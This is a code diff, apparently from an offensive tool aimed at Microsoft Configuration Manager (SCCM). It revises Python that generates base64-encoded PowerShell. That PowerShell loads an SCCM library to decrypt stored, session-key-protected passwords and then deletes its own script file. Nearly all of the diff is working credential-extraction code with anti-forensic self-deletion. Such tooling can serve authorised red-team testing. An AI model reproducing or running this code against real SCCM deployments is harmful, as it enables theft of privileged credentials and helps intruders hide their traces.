@@ -258,11 +258,11 @@ Do-Delete
             $PSCmdlet.ThrowTerminatingError($_)
         }
     }
-
-    Invoke-Decrypt -Hex %r
     function Do-Delete {
         Del $MyInvocation.PSCommandPath
     }
+
+    Invoke-Decrypt -Hex %r
     Do-Delete
     ''' %blob
         bom = codecs.BOM_UTF16_LE
@@ -273,36 +273,63 @@ Do-Delete
 
     def decryptEx(self, device, session_key, encrypted_blob):
         script = '''
-$sessionKey = 
-$encryptedPwd = '{encrypted_blog}'
-$dllPath = "C:\Program Files\Microsoft Configuration Manager\bin\X64\microsoft.configurationmanager.commonbase.dll"
-Add-Type -Path $dllPath
-$sessionKeyBytes = [byte[]]::new($sessionKey.Length / 2)
-$encryptedBytes = [byte[]]::new($encryptedPwd.Length / 2)
-for($i = 0; $i -lt $sessionKey.Length; $i += 2) {
-$sessionKeyBytes[$i/2] = [Convert]::ToByte($sessionKey.Substring($i, 2), 16)
+# Load the DLL
+Add-Type -Path "C:\Program Files\Microsoft Configuration Manager\\bin\X64\microsoft.configurationmanager.commonbase.dll"
+
+function Invoke-DecryptEx {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [string]$sessionKey,
+        
+        [Parameter(Mandatory = $true, Position = 1)]
+        [string]$encryptedPwd
+    )
+    
+    try {
+        $sessionKeyBytes = [byte[]]::new($sessionKey.Length / 2)    
+        $encryptedBytes = [byte[]]::new($encryptedPwd.Length / 2)
+        
+        for($i = 0; $i -lt $sessionKey.Length; $i += 2) {
+            $sessionKeyBytes[$i/2] = [Convert]::ToByte($sessionKey.Substring($i, 2), 16)
+        }
+        
+        for($i = 0; $i -lt $encryptedPwd.Length; $i += 2) {
+            $encryptedBytes[$i/2] = [Convert]::ToByte($encryptedPwd.Substring($i, 2), 16)
+        }
+        
+        $encUtil = [Microsoft.ConfigurationManager.CommonBase.EncryptionUtilities]::Instance
+        $decrypted = $encUtil.DecryptWithGeneratedSessionKey($sessionKeyBytes, $encryptedBytes)
+        
+        if ($decrypted -ne $null) {
+            $length = 0
+            foreach($byte in $decrypted) {
+                if ($byte -eq 0 -or $byte -lt 32 -or $byte -gt 126) {
+                    break
+                }
+                $length++
+            }
+            
+            $decryptedString = [System.Text.Encoding]::ASCII.GetString($decrypted, 0, $length)
+            return $decryptedString
+        }
+        else {
+            Write-Warning "Decryption returned null"
+            return $null
+        }
+    }
+    catch {
+        Write-Error "Error during decryption: $_"
+        return $null
+    }
 }
-for($i = 0; $i -lt $encryptedPwd.Length; $i += 2) {
-$encryptedBytes[$i/2] = [Convert]::ToByte($encryptedPwd.Substring($i, 2), 16)
-}
-$encUtil = [Microsoft.ConfigurationManager.CommonBase.EncryptionUtilities]::Instance
-$decrypted = $encUtil.DecryptWithGeneratedSessionKey($sessionKeyBytes, $encryptedBytes)
-if ($decrypted -ne $null) {
-$length = 0
-foreach($byte in $decrypted) {
-if ($byte -eq 0 -or $byte -lt 32 -or $byte -gt 126) {
-break
-}
-$length++
-}
-$decryptedString = [System.Text.Encoding]::ASCII.GetString($decrypted, 0, $length)
-Write-Host $decryptedString"
-}
+
 function Do-Delete {
     Del $MyInvocation.PSCommandPath
 }
+Invoke-DecryptEx -sessionKey %r -encryptedPwd %r
 Do-Delete
-    '''%session_key %encrypted_blob
+    '''%(session_key, encrypted_blob)
         bom = codecs.BOM_UTF16_LE
         byte_array = bom + script.encode('utf-16-le')
         script_body = base64.b64encode(byte_array).decode('utf-8')
